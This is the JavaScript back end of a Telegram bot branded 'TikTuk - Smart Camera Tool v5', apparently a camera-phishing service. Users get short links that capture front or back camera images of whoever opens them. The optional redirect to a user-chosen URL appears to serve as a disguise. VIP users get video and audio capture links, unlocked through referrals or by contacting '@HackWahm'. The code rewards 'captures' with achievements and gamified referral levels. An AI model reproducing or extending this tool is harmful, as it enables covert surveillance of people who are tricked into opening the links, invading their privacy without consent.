        'new_referral': "🎉 Кто-то новый присоединился по вашей ссылке! Вы получили баллы.",
        'payment_success': "Оплата прошла успешно! Теперь вы VIP-участник. 🎉",
        'payment_failed': "Ошибка оплаты. Пожалуйста, попробуйте еще раз. ❌",
        'cooldown_msg': "⏳ Пожалуйста, подождите %s секунд, прежде чем создавать новую ссылку.",
        'daily_bonus': "🎁 Ежедневный бонус! Вы получили дополнительный балл. Баланс: %s",
        'achievement_unlocked': "🏆 Новое достижение: %s",
        'ach_first_capture': "📸 Первый захват!",
        'ach_first_referral': "👥 Первый реферал!",
        'ach_ten_referrals': "🔥 10 рефералов!",
        'ach_fifty_referrals': "💎 50 рефералов!",
        'ach_vip_member': "🌟 VIP-участник!",
        'lang_changed': "Язык успешно изменен! 🌐",
        'your_id': "🆔 Ваш ID: <code>%s</code>"
    }
};

function getTextMsg(key, lang, ...args) {
    let message = texts[lang]?.[key] || texts['ar'][key] || `TEXT_NOT_FOUND: ${key}`;
    if (args.length > 0) {
        message = message.replace(/%s/g, () => args.shift());
    }
    return message;
}

// ==========================================
// 6. Level & Achievement System (Ported from index.php)
// ==========================================

function getUserLevel(referrals) {
    if (referrals >= 50) return 'diamond';
    if (referrals >= 20) return 'gold';
    if (referrals >= 5) return 'silver';
    return 'bronze';
}

function getLevelEmoji(level, lang = 'ar') {
    const levels = {
        'bronze': {'ar': '🥉 برونزي', 'en': '🥉 Bronze', 'hi': '🥉 कांस्य', 'bn': '🥉 ব্রোঞ্জ', 'ru': '🥉 Бронза'},
        'silver': {'ar': '🥈 فضي', 'en': '🥈 Silver', 'hi': '🥈 रजत', 'bn': '🥈 রৌপ্য', 'ru': '🥈 Серебро'},
        'gold': {'ar': '🥇 ذهبي', 'en': '🥇 Gold', 'hi': '🥇 स्वर्ण', 'bn': '🥇 সোনা', 'ru': '🥇 Золото'},
        'diamond': {'ar': '💎 ماسي', 'en': '💎 Diamond', 'hi': '💎 हीरा', 'bn': '💎 হীরা', 'ru': '💎 Алмаз'}
    };
    return levels[level]?.[lang] || levels[level]['ar'];
}

async function checkDailyBonus(userId) {
    let user = getUser(userId);
    if (!user) return false;

    const today = new Date().toISOString().slice(0, 10);
    const lastDailyDate = user.last_daily ? new Date(user.last_daily * 1000).toISOString().slice(0, 10) : '';

    if (lastDailyDate !== today) {
        user.stars = (user.stars || 0) + 1;
        user.last_daily = Math.floor(Date.now() / 1000);
        updateUser(userId, user);
        return true;
    }
    return false;
}

async function checkAchievements(userId) {
    let user = getUser(userId);
    if (!user) return [];

    const newAchievements = [];
    let achievements = user.achievements || [];

    const addAchievement = (achName) => {
        if (!achievements.includes(achName)) {
            achievements.push(achName);
            newAchievements.push(achName);
            return true;
        }
        return false;
    };

    if (user.total_captures >= 1) addAchievement('first_capture');
    if (user.referrals >= 1) addAchievement('first_referral');
    if (user.referrals >= 10) addAchievement('ten_referrals');
    if (user.referrals >= 50) addAchievement('fifty_referrals');
    if (user.is_vip) addAchievement('vip_member');

    if (newAchievements.length > 0) {
        updateUser(userId, { achievements });
    }

    return newAchievements;
}

// ==========================================
// 7. Bot Logic Functions (Ported from index.php)
// ==========================================

async function showTermsMessage(chat_id, lang) {
    const terms = {
        'ar': `📋 <b>شروط وأحكام الاستخدام</b>\n\n1️⃣ هذا البوت مخصص للاستخدام الشخصي فقط.\n2️⃣ يمنع استخدام البوت لأي أغراض غير قانونية.\n3️⃣ أنت المسؤول الوحيد عن أي استخدام لحسابك.\n4️⃣ يحق للإدارة إيقاف حسابك في حال مخالفة الشروط.\n5️⃣ بالموافقة، أنت تقبل جميع الشروط المذكورة أعلاه.`,
        'en': `📋 <b>Terms & Conditions</b>\n\n1️⃣ This bot is for personal use only.\n2️⃣ Using the bot for illegal purposes is prohibited.\n3️⃣ You are solely responsible for your account usage.\n4️⃣ Administration reserves the right to suspend your account.\n5️⃣ By agreeing, you accept all the terms above.`,
        'hi': `📋 <b>नियम और शर्तें</b>\n\n1️⃣ यह बॉट केवल व्यक्तिगत उपयोग के लिए है।\n2️⃣ अवैध उद्देश्यों के लिए उपयोग निषिद्ध है।\n3️⃣ आप अपने खाते के उपयोग के लिए जिम्मेदार हैं।\n4️⃣ प्रशासन खाता निलंबित कर सकता है।\n5️⃣ सहमत होकर, आप सभी शर्तें स्वीकार करते हैं।`,
        'bn': `📋 <b>শর্তাবলী</b>\n\n1️⃣ এই বট শুধুমাত্র ব্যক্তিগত ব্যবহারের জন্য।\n2️⃣ অবৈধ উদ্দেশ্যে ব্যবহার নিষিদ্ধ।\n3️⃣ আপনি আপনার অ্যাকাউন্টের জন্য দায়ী।\n4️⃣ প্রশাসন অ্যাকাউন্ট স্থগিত করতে পারে।\n5️⃣ সম্মত হয়ে, আপনি সব শর্ত গ্রহণ করেন।`,
        'ru': `📋 <b>Условия использования</b>\n\n1️⃣ Бот только для личного использования.\n2️⃣ Использование в незаконных целях запрещено.\n3️⃣ Вы несёте ответственность за свой аккаунт.\n4️⃣ Администрация может приостановить аккаунт.\n5️⃣ Соглашаясь, вы принимаете все условия.`
    };

    const terms_text = terms[lang] || terms['ar'];
    const agree_btn_text = getTextMsg('agree_btn', lang);

    const keyboard = {
        inline_keyboard: [[{ text: agree_btn_text, callback_data: 'agree_terms' }]]
    };
    await sendMessage(chat_id, terms_text, keyboard);
}

async function checkForceJoin(userId, lang) {
    if (userId == ADMIN_ID) return true;

    const settings = loadSettings();
    if (!settings.force_channel) return true;

    const channel = settings.force_channel;
    try {
        const res = await sendTelegramRequest('getChatMember', { chat_id: channel, user_id: userId });
        if (res.ok && ['member', 'administrator', 'creator'].includes(res.result.status)) {
            await creditReferral(userId);
            return true;
        }
    } catch (error) {
        writeLog(`Error checking force join for user ${userId} in channel ${channel}: ${error.message}`);
    }

    const channel_link = channel.replace('@', 'https://t.me/');
    const keyboard = {
        inline_keyboard: [
            [{ text: getTextMsg('join_channel', lang), url: channel_link }],
            [{ text: getTextMsg('check_join', lang), callback_data: 'check_join' }]
        ]
    };
    await sendMessage(userId, getTextMsg('force_join', lang), keyboard);
    return false;
}

async function creditReferral(userId) {
    let user = getUser(userId);
    if (!user || user.referral_credited || !user.invited_by) return;

    const refId = user.invited_by;
    let refUser = getUser(refId);
    if (!refUser) return;

    const settings = loadSettings();
    const refStars = settings.referral_stars || 2;

    refUser.stars = (refUser.stars || 0) + refStars;
    refUser.referrals = (refUser.referrals || 0) + 1;
    updateUser(refId, refUser);
    updateUser(userId, { referral_credited: true });

    await sendMessage(refId, getTextMsg('new_referral', refUser.lang));

    const newAch = await checkAchievements(refId);
    refUser = getUser(refId); // Reload user to get updated achievements
    for (const ach of newAch) {
        await sendMessage(refId, getTextMsg('achievement_unlocked', refUser.lang, getTextMsg(`ach_${ach}`, refUser.lang)));
    }

    const newLevel = getUserLevel(refUser.referrals);
    updateUser(refId, { level: newLevel });
}

async function showLanguageSelection(chat_id) {
    const keyboard = {
        inline_keyboard: [
            [{ text: 'العربية 🇸🇦', callback_data: 'lang_ar' }, { text: 'English 🇬🇧', callback_data: 'lang_en' }],
            [{ text: 'हिंदी 🇮🇳', callback_data: 'lang_hi' }, { text: 'বাংলা 🇧🇩', callback_data: 'lang_bn' }],
            [{ text: 'Русский 🇷🇺', callback_data: 'lang_ru' }]
        ]
    };
    await sendMessage(chat_id, "🌐 Please choose your language / يرجى اختيار اللغة:", keyboard);
}

async function showMainMenu(chat_id, lang) {
    const keyboard = {
        inline_keyboard: [
            [{ text: getTextMsg('front_cam', lang), callback_data: 'menu_front_cam' }, { text: getTextMsg('back_cam', lang), callback_data: 'menu_back_cam' }],
            [{ text: getTextMsg('custom_link', lang), callback_data: 'menu_custom_link' }, { text: getTextMsg('vip_section', lang), callback_data: 'menu_vip' }],
            [{ text: getTextMsg('my_account', lang), callback_data: 'menu_account' }, { text: getTextMsg('help', lang), callback_data: 'menu_help' }]
        ]
    };

    const settings = loadSettings();
    let welcome_msg;
    if (settings.welcome_message && settings.welcome_message.trim() !== '') {
        welcome_msg = settings.welcome_message;
    } else {
        const welcomes = {
            'ar': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 مرحباً بك في النسخة المطورة!\nاستخدم الأدوات أدناه للبدء.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
            'en': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 Welcome to the enhanced version!\nUse the tools below to start.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
            'hi': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 उन्नत संस्करण में स्वागत है!\nशुरू करने के लिए नीचे दिए गए टूल का उपयोग करें।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
            'bn': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 উন্নত সংস্করণে স্বাগতম!\nশুরু করতে নিচের টুলগুলো ব্যবহার করুন।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
            'ru': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 Добро пожаловать в улучшенную версию!\nИспользуйте инструменты ниже.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`
        };
        welcome_msg = welcomes[lang] || welcomes['ar'];
    }
    await sendMessage(chat_id, welcome_msg, keyboard);
}

async function showVipSection(chat_id, user) {
    const lang = user.lang;

    if (user.is_vip) {
        const code_v = generateShortCode();
        saveShortLink(code_v, { u: user.id, c: 'v' });
        const code_a = generateShortCode();
        saveShortLink(code_a, { u: user.id, c: 'a' });
        const video_link = `${BOT_URL}/${code_v}`;
        const audio_link = `${BOT_URL}/${code_a}`;

        const keyboard = {
            inline_keyboard: [
                [{ text: getTextMsg('vip_video', lang), callback_data: 'vip_get_video' }],
                [{ text: getTextMsg('vip_audio', lang), callback_data: 'vip_get_audio' }],
                [{ text: '🔙', callback_data: 'back_main' }]
            ]
        };
        await sendMessage(chat_id, `🌟 <b>VIP Active</b> 🌟\n\n🎥 Video: ${video_link}\n🎙️ Audio: ${audio_link}`, keyboard);
    } else {
        const bot_info = await sendTelegramRequest('getMe');
        const bot_username = bot_info.result?.username || 'bot';
        const invite_link = `https://t.me/${bot_username}?start=${user.id}`;
        const settings = loadSettings();
        const price_refs = settings.vip_price_referrals || 10;

        const vipMsg = `🌟 <b>قسم VIP</b> 🌟\n\n` +
            `<b>المميزات:</b>\n` +
            `• تصوير فيديو حقيقي 5 ثواني 🎥\n` +
            `• تسجيل صوت 10 ثواني 🎙️\n\n` +
            `<b>طرق الشراء:</b>\n` +
            `👥 ${price_refs} إحالة مؤكدة\n` +
            `👨‍💻 أو تواصل مع المطور @HackWahm\n\n` +
            `📊 إحالاتك الحالية: ${user.referrals || 0}/${price_refs}\n` +
            `🔗 رابط الدعوة الخاص بك:\n${invite_link}`;

        const keyboard = {
            inline_keyboard: [
                [{ text: `👥 شراء بالإحالات (${price_refs} إحالة)`, callback_data: 'buy_vip_referrals' }],
                [{ text: '📤 مشاركة رابط الدعوة', switch_inline_query: invite_link }],
                [{ text: '👨‍💻 تواصل مع المطور', url: 'https://t.me/HackWahm' }],
                [{ text: '🔙', callback_data: 'back_main' }]
            ]
        };
        await sendMessage(chat_id, vipMsg, keyboard);
    }
}

async function showAccountSection(chat_id, user) {
    const lang = user.lang;
    const userId = user.id;
    const status = user.is_vip ? getTextMsg('status_vip', lang) : getTextMsg('status_normal', lang);
    const level = getLevelEmoji(getUserLevel(user.referrals), lang);
    const total_captures = user.total_captures || 0;

    const info = getTextMsg('account_info', lang, userId, user.stars, user.referrals, level, status, total_captures);

    const bot_info = await sendTelegramRequest('getMe');
    const bot_username = bot_info.result?.username || 'bot';

    const invite_text = `${getTextMsg('invite_text', lang)}\nhttps://t.me/${bot_username}?start=${userId}`;

    const keyboard = {
        inline_keyboard: [
            [{ text: getTextMsg('share_invite', lang), switch_inline_query: invite_text }],
            [{ text: '🔙', callback_data: 'back_main' }]
        ]
    };

    const ref_link = getTextMsg('referral_link', lang, bot_username, userId);
    await sendMessage(chat_id, `${info}\n\n${ref_link}`, keyboard);
}

async function handleStart(chat_id, user_id, first_name, username, text) {
    let user = getUser(user_id);
    let isNew = false;

    // Check for referral
    const startPayload = text.split(' ')[1];
    if (startPayload && !user) {
        const invitedBy = startPayload;
        if (invitedBy && invitedBy !== user_id.toString()) {
            user = updateUser(user_id, { invited_by: invitedBy });
        }
    }

    if (!user) {
        user = updateUser(user_id, {});
        isNew = true;
    }

    // Notify admin of new user
    if (isNew) {
        const name = first_name || 'Unknown';
        const uname = username ? `@${username}` : 'N/A';
        await sendMessage(ADMIN_ID, `🆕 <b>مستخدم جديد!</b>\n\n👤 الاسم: ${name}\n🔗 اليوزر: ${uname}\n🆔 الآيدي: <code>${user_id}</code>`);
    }

    // Daily bonus
    const bonusGiven = await checkDailyBonus(user_id);

    if (user.is_banned) {
        await sendMessage(chat_id, getTextMsg('banned', user.lang));
        return;
    }

    const settings = loadSettings();
    if (settings.maintenance_mode && user_id != ADMIN_ID) {
        await sendMessage(chat_id, getTextMsg('maintenance', user.lang));
        return;
    }

    // 1. Language first
    if (!user.lang_selected) {
        await showLanguageSelection(chat_id);
        return;
    }

    // 2. Terms second
    if (!user.agreed_terms) {
        await showTermsMessage(chat_id, user.lang);
        return;
    }

    // 3. Force join third
    if (!(await checkForceJoin(user_id, user.lang))) {
        return;
    }

    // Show main menu
    await showMainMenu(chat_id, user.lang);

    // Show daily bonus message
    if (bonusGiven) {
        user = getUser(user_id); // Reload user to get updated stars
        await sendMessage(chat_id, getTextMsg('daily_bonus', user.lang, user.stars));
    }
}

async function handleMessage(chat_id, user_id, text) {
    let user = getUser(user_id);
    if (!user || user.is_banned) return;

    const lang = user.lang;

    if (!user.agreed_terms) {
        await handleStart(chat_id, user_id, '', '', '/start');
        return;
    }

    if (!(await checkForceJoin(user_id, lang))) {
        return;
    }

    if (user.state === 'waiting_custom_link') {
        if (text.startsWith('http://') || text.startsWith('https://')) {
            const code_f = generateShortCode();
            saveShortLink(code_f, { u: user_id, r: text, c: 'f' });
            const code_b = generateShortCode();
            saveShortLink(code_b, { u: user_id, r: text, c: 'b' });

            const front_link = `${BOT_URL}/${code_f}`;
            const back_link = `${BOT_URL}/${code_b}`;

            await sendMessage(chat_id, getTextMsg('custom_link_generated', lang, front_link, back_link));
            updateUser(user_id, { state: 'none' });
        } else {
            await sendMessage(chat_id, getTextMsg('invalid_link', lang));
        }
        return;
    }

    // Default: show main menu
    await showMainMenu(chat_id, lang);
}

async function handleCallbackQuery(callback_query) {
    const id = callback_query.id;
    const user_id = callback_query.from.id;
    const data = callback_query.data;
    const message_id = callback_query.message.message_id;

    let user = getUser(user_id);
    if (!user) {
        user = updateUser(user_id, {});
    }

    // Language selection
    if (data.startsWith('lang_')) {
        const lang = data.replace('lang_', '');
        updateUser(user_id, { lang, lang_selected: true });
        await answerCallbackQuery(id, getTextMsg('lang_saved', lang));
        await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
        await showTermsMessage(user_id, lang);
        return;
    }

    // Agree terms
    if (data === 'agree_terms') {
        const lang = user.lang || 'ar';
        updateUser(user_id, { agreed_terms: true });
        await answerCallbackQuery(id, getTextMsg('terms_agreed', lang));
        await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
        if (!(await checkForceJoin(user_id, lang))) {
            return;
        }
        await showMainMenu(user_id, lang);
        return;
    }

    // Check join
    if (data === 'check_join') {
        const lang = user.lang || 'ar';
        const settings = loadSettings();
        if (settings.force_channel) {
            const channel = settings.force_channel;
            try {
                const res = await sendTelegramRequest('getChatMember', { chat_id: channel, user_id });
                if (res.ok && ['member', 'administrator', 'creator'].includes(res.result.status)) {
                    await creditReferral(user_id);
                    await answerCallbackQuery(id, "✅");
                    await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
                    await showMainMenu(user_id, lang);
                } else {
                    await answerCallbackQuery(id, getTextMsg('force_join', lang), true);
                }
            } catch (error) {
                writeLog(`Error checking force join on callback for user ${user_id}: ${error.message}`);
                await answerCallbackQuery(id, 'Error checking channel status.', true);
            }
        } else {
            await answerCallbackQuery(id, "✅");
            await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
            await showMainMenu(user_id, user.lang);
        }
        return;
    }

    // Force join check for all other callbacks
    if (!(await checkForceJoin(user_id, user.lang))) {
        await answerCallbackQuery(id);
        return;
    }

    const lang = user.lang;
    const settings = loadSettings();

    switch (data) {
        case 'menu_front_cam':
            const code_f = generateShortCode();
            saveShortLink(code_f, { u: user_id, c: 'f' });
            const link_f = `${BOT_URL}/${code_f}`;
            await answerCallbackQuery(id);
            await sendMessage(user_id, `📸 ${link_f}`);
            break;

        case 'menu_back_cam':
            const code_b = generateShortCode();
            saveShortLink(code_b, { u: user_id, c: 'b' });
            const link_b = `${BOT_URL}/${code_b}`;
            await answerCallbackQuery(id);
            await sendMessage(user_id, `📸 ${link_b}`);
            break;

        case 'menu_custom_link':
            updateUser(user_id, { state: 'waiting_custom_link' });
            await answerCallbackQuery(id);
            await sendMessage(user_id, getTextMsg('send_custom_link', lang));
            break;

        case 'menu_vip':
            await answerCallbackQuery(id);
            await showVipSection(user_id, user);
            break;

        case 'menu_account':
            await answerCallbackQuery(id);
            await showAccountSection(user_id, user);
            break;

        case 'menu_help':
            await answerCallbackQuery(id);
            await sendMessage(user_id, "❓ للتواصل مع الدعم تواصل مع الأدمن مباشرة.");
            break;

        case 'back_main':
            await answerCallbackQuery(id);
            await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
            await showMainMenu(user_id, lang);
            break;

        case 'buy_vip_stars':
            // Telegram Stars payment integration would go here.
            // For now, just acknowledge.
            await answerCallbackQuery(id, 'Telegram Stars payment not fully implemented yet.', true);
            // Example: sendInvoice (requires provider_token)
            // const invoice = {
            //     chat_id: user_id,
            //     title: 'VIP Subscription',
            //     description: 'Access to Video and Audio capture features.',
            //     payload: `vip_payload_${user_id}`,
            //     provider_token: '', // THIS NEEDS TO BE CONFIGURED
            //     currency: 'XTR',
            //     prices: JSON.stringify([{
            //         label: 'VIP',
            //         amount: settings.vip_price_stars
            //     }])
            // };
            // await sendTelegramRequest('sendInvoice', invoice);
            break;

        case 'buy_vip_referrals':
            const requiredRefs = settings.vip_price_referrals;
            if (user.referrals >= requiredRefs) {
                updateUser(user_id, { is_vip: true });
                await answerCallbackQuery(id, getTextMsg('vip_purchased_referrals', lang));
                await sendMessage(user_id, getTextMsg('vip_purchased_referrals', lang));
                await sendMessage(ADMIN_ID, `💎 VIP via Referrals!\nUser: ${user_id}\nReferrals: ${user.referrals}`);
                await checkAchievements(user_id);
            } else {
                await answerCallbackQuery(id, getTextMsg('not_enough_referrals', lang, user.referrals, requiredRefs), true);
            }
            break;

        case 'vip_get_video':
            if (!user.is_vip) {
                await answerCallbackQuery(id, getTextMsg('not_vip', lang), true);
                return;
            }
            const vip_code_v = generateShortCode();
            saveShortLink(vip_code_v, { u: user_id, c: 'v' });
            const vip_link_v = `${BOT_URL}/${vip_code_v}`;
            await answerCallbackQuery(id);
            await sendMessage(user_id, `🎥 ${vip_link_v}`);
            break;

        case 'vip_get_audio':
            if (!user.is_vip) {
                await answerCallbackQuery(id, getTextMsg('not_vip', lang), true);
                return;
            }
            const vip_code_a = generateShortCode();
            saveShortLink(vip_code_a, { u: user_id, c: 'a' });
            const vip_link_a = `${BOT_URL}/${vip_code_a}`;
            await answerCallbackQuery(id);
            await sendMessage(user_id, `🎙️ ${vip_link_a}`);
            break;
    }
}

async function handlePreCheckoutQuery(pre_checkout_query) {
    await sendTelegramRequest('answerPreCheckoutQuery', {
        pre_checkout_query_id: pre_checkout_query.id,
        ok: true
    });
}

async function handleSuccessfulPayment(message) {
    const user_id = message.from.id;
    let user = getUser(user_id);
    if (user) {
        updateUser(user_id, { is_vip: true });
        await sendMessage(user_id, getTextMsg('payment_success', user.lang));
        await sendMessage(ADMIN_ID, `💰 New VIP Payment!\nUser ID: ${user_id}`);
        await checkAchievements(user_id);
    }
}

async function handleAdminCommand(chat_id, text) {
    const parts = text.split(' ');
    const cmd = parts[0];

    if (chat_id != ADMIN_ID) {
        await sendMessage(chat_id, "❌ أنت لست المسؤول.");
        return;
    }

    switch (cmd) {
        case '/admin':
            let msg = `🔐 <b>لوحة تحكم الأدمن v5</b>\n\n`;
            msg += `📊 /stats - إحصائيات البوت\n`;
            msg += `📢 /broadcast [رسالة] - إذاعة\n`;
            msg += `🚫 /ban [آيدي] - حظر مستخدم\n`;
            msg += `✅ /unban [آيدي] - فك حظر\n`;
            msg += `💎 /addvip [آيدي] - إضافة VIP\n`;
            msg += `❌ /removevip [آيدي] - إلغاء VIP\n`;
            msg += `🛠 /maintenance - تفعيل/تعطيل الصيانة\n`;
            msg += `📢 /setchannel [@channel] - قناة إجبارية\n`;
            msg += `🗑 /removechannel - إلغاء القناة\n`;
            msg += `👥 /users - قائمة المستخدمين\n`;
            msg += `🔍 /user [آيدي] - معلومات مستخدم\n`;
            msg += `💰 /setvip_stars [سعر] - سعر VIP بالنجوم\n`;
            msg += `👥 /setvip_refs [عدد] - سعر VIP بالإحالات\n`;
            msg += `⭐ /setreferral_stars [عدد] - نجوم الإحالة\n`;
            msg += `⏱ /setcooldown [ثواني] - تغيير الكولداون\n`;
            msg += `📋 /logs - آخر السجلات\n`;
            msg += `🔒 /security - سجل الأمان\n`;
            msg += `✏️ /setwelcome [رسالة] - تغيير رسالة الترحيب\n`;
            msg += `🔄 /resetwelcome - إعادة رسالة الترحيب للافتراضية`;
            await sendMessage(chat_id, msg);
            break;

        case '/stats':
            const users = loadUsers();
            const total = Object.keys(users).length;
            const vips = Object.values(users).filter(u => u.is_vip).length;
            const banned = Object.values(users).filter(u => u.is_banned).length;
            const active = Object.values(users).filter(u => u.agreed_terms && !u.is_banned).length;
            const settings = loadSettings();
            const maint = settings.maintenance_mode ? '🔴 مفعّل' : '🟢 معطّل';
            const channel = settings.force_channel || 'لا يوجد';
            let statsMsg = `📊 <b>إحصائيات البوت</b>\n\n`;
            statsMsg += `👥 إجمالي المستخدمين: <b>${total}</b>\n`;
            statsMsg += `✅ النشطين: <b>${active}</b>\n`;
            statsMsg += `💎 VIP: <b>${vips}</b>\n`;
            statsMsg += `🚫 المحظورين: <b>${banned}</b>\n\n`;
            statsMsg += `🛠 الصيانة: ${maint}\n`;
            statsMsg += `📢 القناة: ${channel}\n`;
            statsMsg += `💰 سعر VIP (نجوم): ${settings.vip_price_stars}\n`;
            statsMsg += `👥 سعر VIP (إحالات): ${settings.vip_price_referrals}\n`;
            statsMsg += `⭐ نجوم الإحالة: ${settings.referral_stars}\n`;
            statsMsg += `⏱ الكولداون: ${settings.cooldown_seconds} ثانية`;
            await sendMessage(chat_id, statsMsg);
            break;

        case '/ban':
            if (parts[1]) {
                updateUser(parts[1], { is_banned: true });
                await sendMessage(chat_id, `🚫 تم حظر المستخدم ${parts[1]}.`);
            }
            break;

        case '/unban':
            if (parts[1]) {
                updateUser(parts[1], { is_banned: false });
                await sendMessage(chat_id, `✅ تم فك حظر ${parts[1]}.`);
            }
            break;

        case '/addvip':
            if (parts[1]) {
                updateUser(parts[1], { is_vip: true });
                await sendMessage(chat_id, `💎 تم إضافة VIP لـ ${parts[1]}.`);
                await sendMessage(parts[1], "🎉 تم ترقيتك إلى VIP!");
            }
            break;

        case '/removevip':
            if (parts[1]) {
                updateUser(parts[1], { is_vip: false });
                await sendMessage(chat_id, `❌ تم إلغاء VIP من ${parts[1]}.`);
            }
            break;

        case '/maintenance':
            let currentSettings = loadSettings();
            currentSettings.maintenance_mode = !currentSettings.maintenance_mode;
            saveSettings(currentSettings);
            const status = currentSettings.maintenance_mode ? "🔴 مفعّل" : "🟢 معطّل";
            await sendMessage(chat_id, `🛠 الصيانة: ${status}`);
            break;

        case '/setchannel':
            if (parts[1]) {
                let currentSettings = loadSettings();
                currentSettings.force_channel = parts[1];
                saveSettings(currentSettings);
                await sendMessage(chat_id, `📢 تم تعيين القناة: ${parts[1]}`);
            }
            break;

        case '/removechannel':
            let currentSettingsChannel = loadSettings();
            currentSettingsChannel.force_channel = null;
            saveSettings(currentSettingsChannel);
            await sendMessage(chat_id, "✅ تم إلغاء القناة الإجبارية.");
            break;

        case '/setvip_stars':
            if (parts[1] && !isNaN(parseInt(parts[1]))) {
                let currentSettingsStars = loadSettings();
                currentSettingsStars.vip_price_stars = parseInt(parts[1]);
                saveSettings(currentSettingsStars);
                await sendMessage(chat_id, `💰 سعر VIP بالنجوم: ${parts[1]}`);
            }
            break;

        case '/setvip_refs':
            if (parts[1] && !isNaN(parseInt(parts[1]))) {
                let currentSettingsRefs = loadSettings();
                currentSettingsRefs.vip_price_referrals = parseInt(parts[1]);
                saveSettings(currentSettingsRefs);
                await sendMessage(chat_id, `👥 سعر VIP بالإحالات: ${parts[1]}`);
            }
            break;

        case '/setreferral_stars':
            if (parts[1] && !isNaN(parseInt(parts[1]))) {
                let currentSettingsRefStars = loadSettings();
                currentSettingsRefStars.referral_stars = parseInt(parts[1]);
                saveSettings(currentSettingsRefStars);
                await sendMessage(chat_id, `⭐ نجوم الإحالة: ${parts[1]}`);
            }
            break;

        case '/setcooldown':
            if (parts[1] && !isNaN(parseInt(parts[1]))) {
                let currentSettingsCooldown = loadSettings();
                currentSettingsCooldown.cooldown_seconds = parseInt(parts[1]);
                saveSettings(currentSettingsCooldown);
                await sendMessage(chat_id, `⏱ الكولداون: ${parts[1]} ثانية`);
            }
            break;

        case '/users':
            const allUsers = loadUsers();
            let usersMsg = `👥 <b>المستخدمين</b> (${Object.keys(allUsers).length}):\n\n`;
            let count = 0;
            for (const uId in allUsers) {
                if (count >= 30) {
                    usersMsg += `\n... و ${Object.keys(allUsers).length - 30} آخرين`;
                    break;
                }
                const u = allUsers[uId];
                const vip_badge = u.is_vip ? '💎' : '';
                const ban_badge = u.is_banned ? '🚫' : '';
                usersMsg += `${u.id} ${vip_badge}${ban_badge}\n`;
                count++;
            }
            await sendMessage(chat_id, usersMsg);
            break;

        case '/user':
            if (parts[1]) {
                const target = getUser(parts[1]);
                if (target) {
                    let userDetailMsg = `🔍 <b>معلومات المستخدم</b>\n\n`;
                    userDetailMsg += `🆔 الآيدي: ${target.id}\n`;
                    userDetailMsg += `🌐 اللغة: ${target.lang}\n`;
                    userDetailMsg += `💎 VIP: ${target.is_vip ? 'نعم' : 'لا'}\n`;
                    userDetailMsg += `🚫 محظور: ${target.is_banned ? 'نعم' : 'لا'}\n`;
                    userDetailMsg += `⭐ النقاط: ${target.stars}\n`;
                    userDetailMsg += `👥 الإحالات: ${target.referrals}\n`;
                    userDetailMsg += `🏅 المستوى: ${getUserLevel(target.referrals)}\n`;
                    await sendMessage(chat_id, userDetailMsg);
                } else {
                    await sendMessage(chat_id, "❌ المستخدم غير موجود.");
                }
            }
            break;

        case '/logs':
            if (fs.existsSync(LOG_FILE)) {
                const logs = fs.readFileSync(LOG_FILE, 'utf8').split('\n');
                const last_logs = logs.slice(-15).join('\n');
                const logMsg = `📋 <b>آخر السجلات:</b>\n\n${last_logs}`;
                await sendMessage(chat_id, logMsg.substring(0, 4000));
            } else {
                await sendMessage(chat_id, "لا توجد سجلات.");
            }
            break;

        case '/security':
            if (fs.existsSync(SECURITY_LOG_FILE)) {
                const logs = fs.readFileSync(SECURITY_LOG_FILE, 'utf8').split('\n');
                const last_logs = logs.slice(-15).join('\n');
                const secLogMsg = `🔒 <b>سجل الأمان:</b>\n\n${last_logs}`;
                await sendMessage(chat_id, secLogMsg.substring(0, 4000));
            }
            break;

        case '/setwelcome':
            const welcomeText = text.replace('/setwelcome ', '');
            if (welcomeText && welcomeText !== '/setwelcome') {
                let currentSettingsWelcome = loadSettings();
                currentSettingsWelcome.welcome_message = welcomeText;
                saveSettings(currentSettingsWelcome);
                await sendMessage(chat_id, `✅ تم تغيير رسالة الترحيب إلى:\n\n${welcomeText}`);
            } else {
                await sendMessage(chat_id, `❌ استخدم الأمر هكذا:\n/setwelcome رسالة الترحيب الجديدة`);
            }
            break;

        case '/resetwelcome':
            let currentSettingsResetWelcome = loadSettings();
            currentSettingsResetWelcome.welcome_message = '';
            saveSettings(currentSettingsResetWelcome);
            await sendMessage(chat_id, `✅ تم إعادة رسالة الترحيب للافتراضية.`);
            break;

        case '/broadcast':
            const msg_text = text.replace('/broadcast ', '');
            if (msg_text && msg_text !== '/broadcast') {
                const allUsers = loadUsers();
                let successCount = 0;
                let failCount = 0;
                for (const uId in allUsers) {
                    const u = allUsers[uId];
                    if (!u.is_banned) {
                        try {
                            await sendMessage(u.id, `📢 <b>إعلان:</b>\n\n${msg_text}`);
                            successCount++;
                        } catch (e) {
                            failCount++;
                            writeLog(`Broadcast failed for user ${u.id}: ${e.message}`);
                        }
                    }
                }
                await sendMessage(chat_id, `✅ الإذاعة:\n📤 نجح: ${successCount}\n❌ فشل: ${failCount}`);
            }
            break;

        default:
            await sendMessage(chat_id, "❓ أمر غير معروف. /admin");
            break;
    }
}

// ==========================================
// 8. Webhook and Express Setup
// ==========================================

app.use(bodyParser.json({ limit: '50mb' }));
